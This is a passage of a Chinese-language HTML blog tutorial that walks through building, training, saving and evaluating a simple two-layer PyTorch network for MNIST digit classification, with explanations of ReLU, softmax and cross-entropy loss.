punctuation">,</span>                               torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span>                                 <span class="token punctuation">(</span><span class="token number">0.1307</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.3081</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                             <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#准备数据迭代器                          </span>train_dataloader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><h4 id="3-构建模型">3. 构建模型</h4><p>补充：<strong>全连接层</strong>：当前一层的神经元和前一层的神经元相互链接，其核心操作就是$y = wx$，即矩阵的乘法，实现对前一层的数据的变换</p><p>模型的构建使用了一个三层的神经网络，其中包括两个全连接层和一个输出层，第一个全连接层会经过激活函数的处理，将处理后的结果交给下一个全连接层，进行变换后输出结果</p><p>那么在这个模型中有两个地方需要注意：</p><ol><li>激活函数如何使用</li><li>每一层数据的形状</li><li>模型的损失函数</li></ol><h5 id="3-1-激活函数的使用">3.1 激活函数的使用</h5><p>前面介绍了激活函数的作用，常用的激活函数为Relu激活函数，他的使用非常简单</p><p>Relu激活函数由<code>import torch.nn.functional as F</code>提供，<code>F.relu(x)</code>即可对x进行处理</p><p>例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">:</span> bOut<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">:</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> FIn <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">:</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>b<span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">:</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-2-模型中数据的形状（【添加形状变化图形】）">3.2  模型中数据的形状（【添加形状变化图形】）</h5><ol><li>原始输入数据为的形状:<code>[batch_size,1,28,28]</code></li><li>进行形状的修改：<code>[batch_size,28*28]</code> ,(全连接层是在进行矩阵的乘法操作)</li><li>第一个全连接层的输出形状：<code>[batch_size,28]</code>，这里的28是个人设定的，你也可以设置为别的</li><li>激活函数不会修改数据的形状</li><li>第二个全连接层的输出形状：<code>[batch_size,10]</code>,因为手写数字有10个类别</li></ol><p>构建模型的代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">class</span> <span class="token class-name">MnistNet</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>MnistNet<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>  <span class="token comment">#定义Linear的输入和输出的形状</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment">#定义Linear的输入和输出的形状</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">#对数据形状变形，-1表示该位置根据后面的形状自动调整</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#[batch_size,28]</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">#[batch_size,28]</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#[batch_size,10]</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现：pytorch在构建模型的时候<code>形状上</code>并不会考虑<code>batch_size</code></p><h5 id="3-3-模型的损失函数">3.3 模型的损失函数</h5><p>首先，我们需要明确，当前我们手写字体识别的问题是一个多分类的问题，所谓多分类对比的是之前学习的2分类</p><p>回顾之前的课程，我们在逻辑回归中，我们使用sigmoid进行计算对数似然损失，来定义我们的2分类的损失。</p><ul><li><p>在2分类中我们有正类和负类，正类的概率为$P(x) =  \frac{1}{1+e^{-x}} = \frac{e^x}{1+e^x}$,那么负类的概率为$1-P(x)$</p></li><li><p>将这个结果进行计算对数似然损失$-\sum y log(P(x))$就可以得到最终的损失</p></li></ul><p>那么在多分类的过程中我们应该怎么做呢？</p><ul><li><p>多分类和2分类中唯一的区别是我们不能够再使用sigmoid函数来计算当前样本属于某个类别的概率，而应该使用softmax函数。</p></li><li><p>softmax和sigmoid的区别在于我们需要去计算样本属于每个类别的概率，需要计算多次，而sigmoid只需要计算一次</p></li></ul><p>softmax的公式如下：<br>$$<br>\sigma(z)<em>j = \frac{e^{z_j}}{\sum^K</em>{k=1}e^{z_K}}  ,j=1 \cdots k<br>$$</p><p>例如下图：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5Csoftmax.png" alt=""></p><p>假如softmax之前的输出结果是<code>2.3, 4.1, 5.6</code>,那么经过softmax之后的结果是多少呢？<br>$$<br>Y1 = \frac{e^{2.3}}{e^{2.3}+e^{4.1}+e^{5.6}} \<br>Y2 = \frac{e^{4.1}}{e^{2.3}+e^{4.1}+e^{5.6}} \<br>Y3 = \frac{e^{5.6}}{e^{2.3}+e^{4.1}+e^{5.6}} \<br>$$</p><p>对于这个softmax输出的结果，是在[0,1]区间，我们可以把它当做概率</p><p>和前面2分类的损失一样，多分类的损失只需要再把这个结果进行对数似然损失的计算即可</p><p>即：<br>$$<br>\begin{align*}<br>&amp; J = -\sum Y log§ &amp;, 其中 P = \frac{e^{z_j}}{\sum^K_{k=1}e^{z_K}} ,Y表示真实值<br>\end{align*}<br>$$<br>最后，会计算每个样本的损失，即上式的平均值</p><p>我们把softmax概率传入对数似然损失得到的损失函数称为<strong>交叉熵损失</strong></p><p>在pytorch中有两种方法实现交叉熵损失</p><ol><li><pre><code>criterion = nn.CrossEntropyLoss()loss = criterion(input,target)<pre class="line-numbers language-none"><code class="language-none">2. ```   #1. 对输出值计算softmax和取对数   output = F.log_softmax(x,dim=-1)   #2. 使用torch中带权损失   loss = F.nll_loss(output,target)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ol><p>带权损失定义为：$l_n = -\sum w_{i} x_{i}$，其实就是把$log§$作为$x_i$,把真实值Y作为权重</p><h4 id="4-模型的训练">4. 模型的训练</h4><p>训练的流程：</p><ol><li>实例化模型，设置模型为训练模式</li><li>实例化优化器类，实例化损失函数</li><li>获取，遍历dataloader</li><li>梯度置为0</li><li>进行向前计算</li><li>计算损失</li><li>反向传播</li><li>更新参数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">mnist_net <span class="token operator">=</span> MnistNet<span class="token punctuation">(</span><span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>mnist_net<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lr<span class="token operator">=</span> <span class="token number">0.001</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>    mode <span class="token operator">=</span> <span class="token boolean">True</span>    mnist_net<span class="token punctuation">.</span>train<span class="token punctuation">(</span>mode<span class="token operator">=</span>mode<span class="token punctuation">)</span> <span class="token comment">#模型设置为训练模型</span>        train_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>train<span class="token operator">=</span>mode<span class="token punctuation">)</span> <span class="token comment">#获取训练数据集</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#梯度置为0</span>        output <span class="token operator">=</span> mnist_net<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment">#进行向前计算</span>        loss <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token comment">#带权损失</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#进行反向传播，计算梯度</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#参数更新</span>        <span class="token keyword">if</span> idx <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Train Epoch: {} [{}/{} ({:.0f}%)]\tLoss: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                epoch<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> idx <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">,</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-模型的保存和加载">5. 模型的保存和加载</h4><h5 id="5-1-模型的保存">5.1 模型的保存</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>mnist_net<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"model/mnist_net.pt"</span><span class="token punctuation">)</span> <span class="token comment">#保存模型参数</span>torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>optimizer<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'results/mnist_optimizer.pt'</span><span class="token punctuation">)</span> <span class="token comment">#保存优化器参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-2-模型的加载">5.2 模型的加载</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">mnist_net<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"model/mnist_net.pt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>optimizer<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"results/mnist_optimizer.pt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-模型的评估">6. 模型的评估</h4><p>评估的过程和训练的过程相似，但是：</p><ol><li>不需要计算梯度</li><li>需要收集损失和准确率，用来计算平均损失和平均准确率</li><li>损失的计算和训练时候损失的计算方法相同</li><li>准确率的计算：<ul><li>模型的输出为[batch_size,10]的形状</li><li>其中最大值的位置就是其预测的目标值（预测值进行过sotfmax后为概率，sotfmax中分母都是相同的，分子越大，概率越大）</li><li>最大值的位置获取的方法可以使用<code>torch.max</code>,返回最大值和最大值的位置</li><li>返回最大值的位置后，和真实值（<code>[batch_size]</code>）进行对比，相同表示预测成功</li></ul></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    test_loss <span class="token operator">=</span> <span class="token number">0</span>    correct <span class="token operator">=</span> <span class="token number">0</span>    mnist_net<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#设置模型为评估模式</span>    test_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>train<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment">#获取评估数据集</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#不计算其梯度</span>        <span class="token keyword">for</span> data<span class="token punctuation">,</span> target <span class="token keyword">in</span> test_dataloader<span class="token punctuation">:</span>            output <span class="token operator">=</span> mnist_net<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            test_loss <span class="token operator">+=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span> target<span class="token punctuation">,</span> reduction<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>            pred <span class="token operator">=</span> output<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> keepdim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#获取最大值的位置,[batch_size,1]</span>            correct <span class="token operator">+=</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">.</span>view_as<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#预测准备样本数累加</span>    test_loss <span class="token operator">/=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span> <span class="token comment">#计算平均损失</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nTest set: Avg. loss: {:.4f}, Accuracy: {}/{} ({:.2f}%)\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        test_loss<span class="token punctuation">,</span> correct<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> correct <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-完整的代码如下：">7. 完整的代码如下：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token keyword">from</span> torch <span class="token keyword">import</span> optim<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">import</span> torchvisiontrain_batch_size <span class="token operator">=</span> <span class="token number">64</span>test_batch_size <span class="token operator">=</span> <span class="token number">1000</span>img_size <span class="token operator">=</span> <span class="token number">28</span><span class="token keyword">def</span> <span class="token function">get_dataloader</span><span class="token punctuation">(</span>train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>train<span class="token punctuation">,</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"train 必须是bool类型"</span>    <span class="token comment">#准备数据集，其中0.1307，0.3081为MNIST数据的均值和标准差，这样操作能够对其进行标准化</span>    <span class="token comment">#因为MNIST只有一个通道（黑白图片）,所以元组中只有一个值</span>    dataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>MNIST<span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">,</span> train<span class="token operator">=</span>train<span class="token punctuation">,</span> download<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                                         transform<span class="token operator">=</span>torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>                                         torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                         torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.1307</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.3081</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#准备数据迭代器</span>    batch_size <span class="token operator">=</span> train_batch_size <span class="token keyword">if</span> train <span class="token keyword">else</span> test_batch_size    dataloader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span>batch_size<span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dataloader<span class="token keyword">class</span> <span class="token class-name">MnistNet</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>MnistNet<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">28</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#[batch_size,28]</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment">#[batch_size,28]</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">#[batch_size,10]</span>        <span class="token comment"># return x</span>        <span class="token keyword">return</span> F<span class="token punctuation">.</span>log_softmax<span class="token punctuation">(</span>x<span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>mnist_net <span class="token operator">=</span> MnistNet<span class="token punctuation">(</span><span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>mnist_net<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lr<span class="token operator">=</span> <span class="token number">0.001</span><span class="token punctuation">)</span><span class="token comment"># criterion = nn.NLLLoss()</span><span class="token comment"># criterion = nn.CrossEntropyLoss()</span>train_loss_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>train_count_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>    mode <span class="token operator">=</span> <span class="token boolean">True</span>    mnist_net<span class="token punctuation">.</span>train<span class="token punctuation">(</span>mode<span class="token operator">=</span>mode<span class="token punctuation">)</span>    train_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>train<span class="token operator">=</span>mode<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>        output <span class="token operator">=</span> mnist_net<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        loss <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span>target<span class="token punctuation">)</span> <span class="token comment">#对数似然损失</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> idx <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Train Epoch: {} [{}/{} ({:.0f}%)]\tLoss: {:.6f}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                epoch<span class="token punctuation">,</span> idx <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> idx <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">,</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            train_loss_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            train_count_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token operator">*</span>train_batch_size<span class="token operator">+</span><span class="token punctuation">(</span>epoch<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>mnist_net<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"model/mnist_net.pkl"</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>optimizer<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'results/mnist_optimizer.pkl'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    test_loss <span class="token operator">=</span> <span class="token number">0</span>    correct <span class="token operator">=</span> <span class="token number">0</span>    mnist_net<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    test_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>train<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> data<span class="token punctuation">,</span> target <span class="token keyword">in</span> test_dataloader<span class="token punctuation">:</span>            output <span class="token operator">=</span> mnist_net<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            test_loss <span class="token operator">+=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span> target<span class="token punctuation">,</span> reduction<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>            pred <span class="token operator">=</span> output<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> keepdim<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#获取最大值的位置,[batch_size,1]</span>            correct <span class="token operator">+=</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">.</span>view_as<span class="token punctuation">(</span>pred<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    test_loss <span 